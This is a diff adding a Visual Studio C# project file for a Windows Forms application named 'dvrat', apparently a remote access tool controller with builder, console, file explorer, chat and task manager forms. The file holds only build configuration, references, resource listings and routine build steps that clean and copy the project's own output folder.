@@ -1,0 +1,231 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{5561488E-ED7B-473D-9805-A19E425E65F7}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>dvrat</RootNamespace>
+    <AssemblyName>dvrat</AssemblyName>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <Deterministic>true</Deterministic>
+    <IsWebBootstrapper>false</IsWebBootstrapper>
+    <PublishUrl>publish\</PublishUrl>
+    <Install>true</Install>
+    <InstallFrom>Disk</InstallFrom>
+    <UpdateEnabled>false</UpdateEnabled>
+    <UpdateMode>Foreground</UpdateMode>
+    <UpdateInterval>7</UpdateInterval>
+    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
+    <UpdatePeriodically>false</UpdatePeriodically>
+    <UpdateRequired>false</UpdateRequired>
+    <MapFileExtensions>true</MapFileExtensions>
+    <ApplicationRevision>0</ApplicationRevision>
+    <ApplicationVersion>1.0.0.%2a</ApplicationVersion>
+    <UseApplicationTrust>false</UseApplicationTrust>
+    <BootstrapperEnabled>true</BootstrapperEnabled>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>dv.ico</ApplicationIcon>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="Newtonsoft.Json, Version=13.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6aeed, processorArchitecture=MSIL">
+      <HintPath>..\packages\Newtonsoft.Json.13.0.1\lib\net40\Newtonsoft.Json.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="builder_form.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="builder_form.Designer.cs">
+      <DependentUpon>builder_form.cs</DependentUpon>
+    </Compile>
+    <Compile Include="chat_form.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="chat_form.Designer.cs">
+      <DependentUpon>chat_form.cs</DependentUpon>
+    </Compile>
+    <Compile Include="config_message_box.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="config_message_box.Designer.cs">
+      <DependentUpon>config_message_box.cs</DependentUpon>
+    </Compile>
+    <Compile Include="console_form.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="console_form.Designer.cs">
+      <DependentUpon>console_form.cs</DependentUpon>
+    </Compile>
+    <Compile Include="file_explorer_form.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="file_explorer_form.Designer.cs">
+      <DependentUpon>file_explorer_form.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Form1.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form1.Designer.cs">
+      <DependentUpon>Form1.cs</DependentUpon>
+    </Compile>
+    <Compile Include="modules\rename_dialog.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="modules\rename_dialog.Designer.cs">
+      <DependentUpon>rename_dialog.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Resource1.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resource1.resx</DependentUpon>
+    </Compile>
+    <Compile Include="tsk_mgr_view.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="tsk_mgr_view.Designer.cs">
+      <DependentUpon>tsk_mgr_view.cs</DependentUpon>
+    </Compile>
+    <EmbeddedResource Include="builder_form.resx">
+      <DependentUpon>builder_form.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="chat_form.resx">
+      <DependentUpon>chat_form.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="config_message_box.resx">
+      <DependentUpon>config_message_box.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="console_form.resx">
+      <DependentUpon>console_form.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="file_explorer_form.resx">
+      <DependentUpon>file_explorer_form.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Form1.resx">
+      <DependentUpon>Form1.cs</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="modules\rename_dialog.resx">
+      <DependentUpon>rename_dialog.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <EmbeddedResource Include="Resource1.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resource1.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Include="tsk_mgr_view.resx">
+      <DependentUpon>tsk_mgr_view.cs</DependentUpon>
+    </EmbeddedResource>
+    <None Include="packages.config" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="res\ICO\messagebox.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="res\ICO\hardware.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="res\ICO\FUCK.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.5 SP1</ProductName>
+      <Install>false</Install>
+    </BootstrapperPackage>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="res\ICO\CD-ROM.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="res\ICO\task-manager.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="res\ICO\KILL.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="res\ICO\CHAT.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="res\ICO\file_explorer.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="res\ICO\delete.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="res\ICO\rename.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="res\ICO\refresh.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="res\ICO\new_file.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="dv.ico" />
+    <None Include="res\ICO\new_folder.png" />
+    <None Include="res\ICO\administrator.png" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <PropertyGroup>
+    <PreBuildEvent>if exist "$(ProjectDir)$(OutDir)" (
+ rmdir /s /q "$(ProjectDir)$(OutDir)"
+)</PreBuildEvent>
+  </PropertyGroup>
+  <PropertyGroup>
+    <PostBuildEvent>mkdir "$(ProjectDir)$(OutDir)res" &amp;&amp; xcopy "$(ProjectDir)res" "$(ProjectDir)$(OutDir)res" /e /i /y /s</PostBuildEvent>
+  </PropertyGroup>
+</Project>
